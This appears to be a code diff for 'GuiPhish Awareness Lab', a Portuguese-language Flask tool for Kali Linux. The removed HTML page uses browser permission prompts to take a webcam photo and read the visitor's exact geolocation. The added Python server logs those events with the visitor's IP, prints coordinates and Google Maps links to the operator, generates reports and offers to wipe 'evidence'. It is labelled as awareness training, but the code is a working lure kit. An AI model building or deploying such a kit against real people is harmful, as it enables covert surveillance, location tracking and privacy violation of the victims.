@@ -1,245 +1,241 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<title>GuiPhish Awareness Lab</title>
+import os
+import json
+import shutil
+from datetime import datetime
+from flask import Flask, request, jsonify, send_file
+from flask_cors import CORS
 
-<style>
-body {
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #141e30, #243b55);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    color: white;
-}
+BANNER = r"""
+   ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+  ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
+  ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
+  ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+  ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
+   ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
 
-.container {
-    background: #111827;
-    padding: 40px;
-    border-radius: 16px;
-    text-align: center;
-    max-width: 430px;
-}
+        🔐 GuiPhish Awareness Lab
+        🎣 Security Awareness Toolkit
+        🐧 Running on Kali Linux
+"""
 
-.logo { font-size: 42px; }
+app = Flask(__name__)
+CORS(app)
 
-p {
-    color: #cbd5e1;
-    font-size: 14px;
-}
+PASTAS = ["logs", "fotos", "relatorios"]
 
-button {
-    width: 100%;
-    margin-top: 15px;
-    padding: 14px;
-    border: none;
-    border-radius: 10px;
-    font-weight: bold;
-    cursor: pointer;
-}
+for pasta in PASTAS:
+    os.makedirs(pasta, exist_ok=True)
 
-.btn-location {
-    background: #00e676;
-    color: #000;
-}
 
-.btn-camera {
-    background: #7c4dff;
-    color: white;
-}
+def ler_eventos():
+    caminho = "logs/eventos.jsonl"
 
-.btn-email {
-    background: #ffb020;
-    color: #000;
-}
+    if not os.path.exists(caminho):
+        return []
 
-.status {
-    margin-top: 18px;
-    color: #93c5fd;
-}
+    eventos = []
 
-#video {
-    display: none;
-    width: 300px;
-    margin-top: 20px;
-    border-radius: 10px;
-}
-</style>
-</head>
+    with open(caminho, "r", encoding="utf-8") as f:
+        for linha in f:
+            try:
+                eventos.append(json.loads(linha))
+            except Exception:
+                pass
 
-<body>
+    return eventos
 
-<div class="container">
-    <div class="logo">🔐</div>
-    <h2>GuiPhish Awareness Lab</h2>
 
-    <p>Escolha uma simulação de permissão do navegador.</p>
+def mostrar_logs():
+    eventos = ler_eventos()
 
-    <button class="btn-location" onclick="testarLocalizacao()">
-        🌍 1 - Testar permissão de localização
-    </button>
+    print("\n📊 Últimos eventos:\n")
 
-    <button class="btn-camera" onclick="testarCamera()">
-        📸 2 - Testar permissão de câmera
-    </button>
+    if not eventos:
+        print("[!] Nenhum evento registrado ainda.\n")
+        return
 
-    <button class="btn-email" onclick="simularEmail()">
-        📧 3 - Simulação de e-mail/conta
-    </button>
+    for evento in eventos[-10:]:
+        print(
+            f"- {evento.get('timestamp_servidor')} | "
+            f"{evento.get('tipo')} | "
+            f"{evento.get('acao')} | "
+            f"{evento.get('status')} | "
+            f"IP: {evento.get('ip')}"
+        )
 
-    <p class="status" id="status">Aguardando seleção...</p>
+        if evento.get("google_maps") not in [None, "N/A"]:
+            print(f"  🌍 Maps: {evento.get('google_maps')}")
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-</div>
+        if evento.get("email_domain") not in [None, "N/A"]:
+            print(f"  📧 Domínio: {evento.get('email_domain')}")
 
-<script>
-const statusText = document.getElementById("status");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
+    print("")
 
-async function registrarEvento(tipo, acao, status, extra = {}) {
-    const resposta = await fetch("/evento", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            tipo: tipo,
-            acao: acao,
-            status: status,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ...extra
-        })
-    });
 
-    return resposta.ok;
-}
+def gerar_relatorio():
+    eventos = ler_eventos()
 
-async function testarCamera() {
-    try {
-        statusText.textContent = "Solicitando permissão da câmera...";
+    fotos = []
+    if os.path.exists("fotos"):
+        fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]
 
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: false
-        });
+    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
+    total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
+    total_email = len([e for e in eventos if e.get("tipo") == "email"])
+    total_permitidos = len([e for e in eventos if e.get("status") == "permitida"])
 
-        video.srcObject = stream;
-        video.style.display = "block";
+    nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
 
-        await new Promise(resolve => {
-            video.onloadedmetadata = resolve;
-        });
+    with open(nome, "w", encoding="utf-8") as f:
+        f.write("GuiPhish Awareness Lab - Relatório\n")
+        f.write("=" * 40 + "\n\n")
+        f.write(f"Gerado em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+        f.write(f"Total de eventos: {len(eventos)}\n")
+        f.write(f"Eventos de câmera: {total_camera}\n")
+        f.write(f"Eventos de localização: {total_localizacao}\n")
+        f.write(f"Eventos de e-mail/conta: {total_email}\n")
+        f.write(f"Permissões concedidas: {total_permitidos}\n")
+        f.write(f"Fotos locais salvas: {len(fotos)}\n\n")
 
-        await registrarEvento("camera", "permissao_camera", "permitida");
+        f.write("Últimos eventos:\n")
+        for evento in eventos[-10:]:
+            f.write(json.dumps(evento, ensure_ascii=False) + "\n")
 
-        statusText.textContent = "Permissão concedida ✅ Capturando imagem...";
+    print(f"\n[+] Relatório gerado: {nome}\n")
 
-        setTimeout(async () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
 
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+def limpar_evidencias():
+    confirmacao = input("\n[!] Apagar fotos, logs e relatórios locais? Digite SIM para confirmar: ")
 
-            const image = canvas.toDataURL("image/jpeg", 0.8);
+    if confirmacao != "SIM":
+        print("[+] Operação cancelada.\n")
+        return
 
-            const respostaFoto = await fetch("/capture", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    image: image,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    screen: screen.width + "x" + screen.height,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                })
-            });
+    for pasta in PASTAS:
+        if os.path.exists(pasta):
+            shutil.rmtree(pasta)
+        os.makedirs(pasta, exist_ok=True)
 
-            stream.getTracks().forEach(track => track.stop());
-            video.style.display = "none";
+    print("[+] Evidências locais apagadas com sucesso.\n")
 
-            statusText.textContent = respostaFoto.ok
-                ? "Foto salva com sucesso ✅"
-                : "Erro ao salvar foto ❌";
 
-        }, 1200);
+def menu():
+    print("\n[+] GuiPhish Awareness Lab\n")
+    print("1) 📸 Testar permissão de câmera")
+    print("2) 🌍 Testar permissão de localização")
+    print("3) 📊 Dashboard / visualizar logs")
+    print("4) 🧾 Gerar relatório do lab")
+    print("5) 🧹 Limpar evidências locais")
+    print("6) 📧 Simulação de e-mail/conta")
+    print("7) 🛑 Sair")
 
-    } catch (err) {
-        await registrarEvento("camera", "permissao_camera", "negada");
-        statusText.textContent = "Permissão da câmera negada ❌";
-        alert("Erro: " + err.message);
-    }
-}
+    return input("\nDigite a opção: ")
 
-function testarLocalizacao() {
-    if (!navigator.geolocation) {
-        statusText.textContent = "Geolocalização não suportada ❌";
-        registrarEvento("localizacao", "permissao_localizacao", "nao_suportada");
-        return;
-    }
 
-    statusText.textContent = "Solicitando permissão de localização...";
+@app.route("/")
+def index():
+    return send_file("index.html")
 
-    navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
 
-        statusText.innerHTML =
-            "Localização obtida ✅<br>" +
-            "Latitude: " + lat + "<br>" +
-            "Longitude: " + lon + "<br>" +
-            "Precisão: " + Math.round(accuracy) + " metros<br><br>" +
-            "<a href='https://www.google.com/maps?q=" + lat + "," + lon + "' target='_blank' style='color:#00e676;'>Abrir no Google Maps</a>";
+@app.route("/email")
+def email_page():
+    return send_file("email.html")
 
-        await registrarEvento("localizacao", "permissao_localizacao", "permitida", {
-            latitude: lat,
-            longitude: lon,
-            accuracy: accuracy,
-            google_maps: "https://www.google.com/maps?q=" + lat + "," + lon
-        });
 
-    }, async (error) => {
-        await registrarEvento("localizacao", "permissao_localizacao", "negada");
-        statusText.textContent = "Permissão de localização negada ❌";
-        alert("Erro: " + error.message);
-    });
-}
+@app.route("/evento", methods=["POST"])
+def evento():
+    try:
+        data = request.json or {}
 
-async function simularEmail() {
-    const email = prompt("Digite um e-mail de teste para simulação. Não informe senha.");
+        tipo = data.get("tipo", "desconhecido")
+        modo = app.config.get("MODO", "completo")
 
-    if (!email) {
-        statusText.textContent = "Simulação de e-mail cancelada.";
-        return;
-    }
+        if modo == "camera" and tipo not in ["camera", "email"]:
+            return jsonify({"status": "bloqueado"}), 403
 
-    const emailValido = email.includes("@") && email.includes(".");
-    const dominio = emailValido ? email.split("@")[1] : "formato_invalido";
+        if modo == "localizacao" and tipo != "localizacao":
+            return jsonify({"status": "bloqueado"}), 403
 
-    await registrarEvento("email", "simulacao_email", emailValido ? "informado" : "formato_invalido", {
-        email_domain: dominio
-    });
+        if modo == "email" and tipo != "email":
+            return jsonify({"status": "bloqueado"}), 403
 
-    statusText.innerHTML =
-        "Simulação concluída ✅<br>" +
-        "Domínio identificado: " + dominio + "<br><br>" +
-        "⚠️ Nunca informe senha, MFA ou dados sensíveis em páginas não verificadas.";
-}
-</script>
+        evento_log = {
+            "timestamp_servidor": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "ip": request.remote_addr,
+            "tipo": tipo,
+            "acao": data.get("acao", "N/A"),
+            "status": data.get("status", "N/A"),
+            "user_agent": data.get("userAgent", "N/A"),
+            "platform": data.get("platform", "N/A"),
+            "language": data.get("language", "N/A"),
+            "timezone": data.get("timezone", "N/A"),
+            "latitude": data.get("latitude", "N/A"),
+            "longitude": data.get("longitude", "N/A"),
+            "accuracy": data.get("accuracy", "N/A"),
+            "google_maps": data.get("google_maps", "N/A"),
+            "email_domain": data.get("email_domain", "N/A")
+        }
 
-</body>
-</html>
+        with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
+            f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")
+
+        print(f"\n[+] EVENTO REGISTRADO: {tipo} | {evento_log['status']} | IP: {request.remote_addr}")
+
+        if tipo == "localizacao" and evento_log["latitude"] != "N/A":
+            print(f"[+] Localização: {evento_log['latitude']}, {evento_log['longitude']}")
+            print(f"[+] Google Maps: {evento_log['google_maps']}")
+
+        if tipo == "email":
+            print(f"[+] Domínio informado: {evento_log.get('email_domain', 'N/A')}")
+
+        return jsonify({"status": "ok"}), 200
+
+    except Exception as e:
+        print(f"[-] Erro ao registrar evento: {e}")
+        return jsonify({"status": "erro"}), 500
+
+
+@app.route("/painel", methods=["GET"])
+def painel():
+    return "Painel bloqueado. Consulte os eventos localmente em logs/eventos.jsonl.", 403
+
+
+if __name__ == "__main__":
+    print(BANNER)
+
+    while True:
+        escolha = menu()
+
+        if escolha == "1":
+            app.config["MODO"] = "camera"
+            print("\n[+] Modo câmera ativo. Iniciando Flask...\n")
+            break
+
+        elif escolha == "2":
+            app.config["MODO"] = "localizacao"
+            print("\n[+] Modo localização ativo. Iniciando Flask...\n")
+            break
+
+        elif escolha == "3":
+            mostrar_logs()
+
+        elif escolha == "4":
+            gerar_relatorio()
+
+        elif escolha == "5":
+            limpar_evidencias()
+
+        elif escolha == "6":
+            app.config["MODO"] = "email"
+            print("\n[+] Modo simulação de e-mail/conta ativo. Iniciando Flask...\n")
+            break
+
+        elif escolha == "7":
+            print("\n[+] Saindo...\n")
+            exit()
+
+        else:
+            print("\n[!] Opção inválida.\n")
+
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
